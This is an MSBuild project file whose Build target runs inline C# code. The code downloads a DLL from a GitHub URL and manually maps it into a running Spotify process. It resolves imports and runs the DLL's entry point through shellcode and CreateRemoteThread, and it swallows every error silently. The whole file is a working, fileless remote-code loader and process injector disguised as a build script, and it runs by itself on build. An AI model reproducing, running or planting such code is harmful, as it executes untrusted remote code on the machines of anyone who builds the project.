<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <MM />
  </Target>
  <UsingTask TaskName="MM" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <ParameterGroup/>
    <Task>
      <Reference Include="System.Core"/>
      <Code Type="Class" Language="cs"><![CDATA[
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Threading;
using System.Text;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class MM : Task {
    [DllImport("kernel32.dll",SetLastError=true)] static extern IntPtr OpenProcess(uint a,bool b,int c);
    [DllImport("kernel32.dll",SetLastError=true)] static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,IntPtr s,uint t,uint p);
    [DllImport("kernel32.dll",SetLastError=true)] static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,IntPtr s,out IntPtr w);
    [DllImport("kernel32.dll",SetLastError=true)] static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint st,IntPtr fn,IntPtr p,uint f,out uint t);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h,uint m);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")] static extern bool VirtualFreeEx(IntPtr h,IntPtr a,IntPtr s,uint t);
    [DllImport("kernel32.dll",CharSet=CharSet.Ansi,SetLastError=true)] static extern IntPtr GetProcAddress(IntPtr h,string n);
    [DllImport("kernel32.dll",CharSet=CharSet.Unicode,SetLastError=true)] static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32.dll",SetLastError=true)] static extern bool VirtualProtectEx(IntPtr h,IntPtr a,IntPtr s,uint n,out uint o);

    static ushort R2(byte[] b,int o){return (ushort)(b[o]|b[o+1]<<8);}
    static uint R4(byte[] b,int o){return (uint)(b[o]|b[o+1]<<8|b[o+2]<<16|b[o+3]<<24);}
    static ulong R8(byte[] b,int o){return (ulong)R4(b,o)|((ulong)R4(b,o+4)<<32);}
    static void W4(byte[] b,int o,uint v){b[o]=(byte)v;b[o+1]=(byte)(v>>8);b[o+2]=(byte)(v>>16);b[o+3]=(byte)(v>>24);}
    static void W8(byte[] b,int o,ulong v){W4(b,o,(uint)v);W4(b,o+4,(uint)(v>>32));}

    public override bool Execute(){
        try{
            Thread.Sleep(500);

            Process[] procs=Process.GetProcessesByName("Spotify");
            if(procs.Length==0){for(int i=0;i<30&&procs.Length==0;i++){Thread.Sleep(1000);procs=Process.GetProcessesByName("Spotify");}}
            if(procs.Length==0)return true;
            int pid=procs[0].Id;

            ServicePointManager.SecurityProtocol=(SecurityProtocolType)3072;
            byte[] raw;
            using(var wc=new WebClient()){raw=wc.DownloadData("https://raw.githubusercontent.com/washedluca1-lgtm/UDLIKEDMA/main/UDLDMAXYTRUS.dll");}
            if(raw==null||raw.Length<0x200)return true;

            if(R2(raw,0)!=0x5A4D)return true;
            int e_lfanew=(int)R4(raw,0x3C);
            if(e_lfanew<0||e_lfanew>raw.Length-0x108)return true;
            if(R4(raw,e_lfanew)!=0x4550)return true;

            ushort machine=R2(raw,e_lfanew+4);
            ushort numSections=R2(raw,e_lfanew+6);
            ushort sizeOptHdr=R2(raw,e_lfanew+20);
            
            int optHdr=e_lfanew+24;
            ushort magic=R2(raw,optHdr);
            bool is64=magic==0x20B;
            if(!is64)return true;

            uint entryRVA=R4(raw,optHdr+16);
            ulong imageBase=R8(raw,optHdr+24);
            uint sectionAlign=R4(raw,optHdr+32);
            uint fileAlign=R4(raw,optHdr+36);
            uint sizeOfImage=R4(raw,optHdr+56);
            uint sizeOfHeaders=R4(raw,optHdr+60);

            int ddOffset=optHdr+112;
            uint exportRVA=R4(raw,ddOffset);
            uint exportSize=R4(raw,ddOffset+4);
            uint importRVA=R4(raw,ddOffset+8);
            uint importSize=R4(raw,ddOffset+12);
            uint relocRVA=R4(raw,ddOffset+40);
            uint relocSize=R4(raw,ddOffset+44);
            uint iatRVA=R4(raw,ddOffset+96);
            uint iatSize=R4(raw,ddOffset+100);

            int sectionsStart=e_lfanew+24+sizeOptHdr;

            IntPtr hProc=OpenProcess(0x1F0FFF,false,pid);
            if(hProc==IntPtr.Zero)return true;

            IntPtr remoteBase=VirtualAllocEx(hProc,IntPtr.Zero,new IntPtr(sizeOfImage),0x3000,0x40);
            if(remoteBase==IntPtr.Zero){CloseHandle(hProc);return true;}

            byte[] image=new byte[sizeOfImage];
            Array.Copy(raw,0,image,0,(int)sizeOfHeaders);

            for(int i=0;i<numSections;i++){
                int sh=sectionsStart+i*40;
                uint virtAddr=R4(raw,sh+12);
                uint virtSize=R4(raw,sh+8);
                uint rawDataPtr=R4(raw,sh+20);
                uint rawDataSize=R4(raw,sh+16);
                if(rawDataSize>0&&rawDataPtr>0&&rawDataPtr+rawDataSize<=raw.Length)
                    Array.Copy(raw,(int)rawDataPtr,image,(int)virtAddr,(int)Math.Min(rawDataSize,virtSize>0?virtSize:rawDataSize));
            }

            long delta=remoteBase.ToInt64()-(long)imageBase;
            if(delta!=0&&relocRVA>0&&relocSize>0){
                int pos=(int)relocRVA;
                int end=(int)(relocRVA+relocSize);
                while(pos<end&&pos+8<image.Length){
                    uint pageRVA=R4(image,pos);
                    uint blockSize=R4(image,pos+4);
                    if(blockSize<8||blockSize>0x10000)break;
                    int count=((int)blockSize-8)/2;
                    for(int i=0;i<count;i++){
                        ushort entry=R2(image,pos+8+i*2);
                        int type=entry>>12;
                        int off=entry&0xFFF;
                        if(type==10){
                            int addr=(int)pageRVA+off;
                            if(addr+8<=image.Length){
                                ulong val=R8(image,addr);
                                W8(image,addr,(ulong)((long)val+delta));
                            }
                        }
                    }
                    pos+=(int)blockSize;
                }
            }

            IntPtr k32=GetModuleHandle("kernel32.dll");
            IntPtr pLoadLibA=GetProcAddress(k32,"LoadLibraryA");
            IntPtr pGetProcAddr=GetProcAddress(k32,"GetProcAddress");

            if(importRVA>0&&importSize>0){
                int pos=(int)importRVA;
                while(pos+20<=image.Length){
                    uint ilt=R4(image,pos);
                    uint nameRVA=R4(image,pos+12);
                    uint iat=R4(image,pos+16);
                    if(nameRVA==0)break;

                    StringBuilder sb=new StringBuilder();
                    for(int j=(int)nameRVA;j<image.Length&&image[j]!=0;j++)sb.Append((char)image[j]);
                    string modName=sb.ToString();

                    IntPtr hMod=GetModuleHandle(modName);
                    if(hMod==IntPtr.Zero){
                        byte[] nameBytes=Encoding.ASCII.GetBytes(modName+"\0");
                        IntPtr remoteName=VirtualAllocEx(hProc,IntPtr.Zero,new IntPtr(nameBytes.Length),0x3000,0x04);
                        if(remoteName!=IntPtr.Zero){
                            IntPtr written;
                            WriteProcessMemory(hProc,remoteName,nameBytes,new IntPtr(nameBytes.Length),out written);
                            uint tid;
                            IntPtr hThread=CreateRemoteThread(hProc,IntPtr.Zero,0,pLoadLibA,remoteName,0,out tid);
                            if(hThread!=IntPtr.Zero){WaitForSingleObject(hThread,10000);CloseHandle(hThread);}
                            VirtualFreeEx(hProc,remoteName,IntPtr.Zero,0x8000);
                        }
                        hMod=GetModuleHandle(modName);
                    }
                    if(hMod==IntPtr.Zero){pos+=20;continue;}

                    uint thunk=ilt!=0?ilt:iat;
                    int ti=(int)thunk;
                    int ai=(int)iat;
                    while(ti+8<=image.Length&&ai+8<=image.Length){
                        ulong entry=R8(image,ti);
                        if(entry==0)break;
                        IntPtr fn=IntPtr.Zero;
                        if((entry&0x8000000000000000UL)!=0){
                            fn=GetProcAddress(hMod,"#"+(entry&0xFFFF));
                        }else{
                            int hintRVA=(int)entry;
                            if(hintRVA+2<image.Length){
                                StringBuilder fnName=new StringBuilder();
                                for(int j=hintRVA+2;j<image.Length&&image[j]!=0;j++)fnName.Append((char)image[j]);
                                fn=GetProcAddress(hMod,fnName.ToString());
                            }
                        }
                        if(fn!=IntPtr.Zero)W8(image,ai,(ulong)fn.ToInt64());
                        ti+=8;ai+=8;
                    }
                    pos+=20;
                }
            }

            IntPtr written2;
            WriteProcessMemory(hProc,remoteBase,image,new IntPtr(image.Length),out written2);

            for(int i=0;i<numSections;i++){
                int sh=sectionsStart+i*40;
                uint virtAddr=R4(raw,sh+12);
                uint virtSize=R4(raw,sh+8);
                uint chars=R4(raw,sh+36);
                if(virtSize==0)virtSize=R4(raw,sh+16);
                
                uint prot=0x02;
                if((chars&0x20000000)!=0&&(chars&0x80000000)!=0)prot=0x40;
                else if((chars&0x20000000)!=0)prot=0x20;
                else if((chars&0x80000000)!=0)prot=0x04;
                else if((chars&0x40000000)!=0)prot=0x02;
                
                uint oldProt;
                VirtualProtectEx(hProc,new IntPtr(remoteBase.ToInt64()+(long)virtAddr),new IntPtr(virtSize),prot,out oldProt);
            }

            if(entryRVA!=0){
                long epAddr=remoteBase.ToInt64()+(long)entryRVA;
                byte[] shellcode=new byte[]{
                    0x48,0x83,0xEC,0x28,
                    0x48,0xB9,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                    0xBA,0x01,0x00,0x00,0x00,
                    0x4D,0x31,0xC0,
                    0x48,0xB8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                    0xFF,0xD0,
                    0xB8,0x01,0x00,0x00,0x00,
                    0x48,0x83,0xC4,0x28,
                    0xC3
                };
                byte[] baseBytes=BitConverter.GetBytes(remoteBase.ToInt64());
                byte[] epBytes=BitConverter.GetBytes(epAddr);
                Array.Copy(baseBytes,0,shellcode,6,8);
                Array.Copy(epBytes,0,shellcode,24,8);

                IntPtr scAddr=VirtualAllocEx(hProc,IntPtr.Zero,new IntPtr(shellcode.Length),0x3000,0x40);
                if(scAddr!=IntPtr.Zero){
                    WriteProcessMemory(hProc,scAddr,shellcode,new IntPtr(shellcode.Length),out written2);
                    uint tid;
                    IntPtr hThread=CreateRemoteThread(hProc,IntPtr.Zero,0,scAddr,IntPtr.Zero,0,out tid);
                    if(hThread!=IntPtr.Zero){
                        WaitForSingleObject(hThread,60000);
                        CloseHandle(hThread);
                    }
                    Thread.Sleep(500);
                    VirtualFreeEx(hProc,scAddr,IntPtr.Zero,0x8000);
                }
            }

            CloseHandle(hProc);
        }catch{}
        return true;
    }
}
      ]]></Code>
    </Task>
  </UsingTask>
</Project>
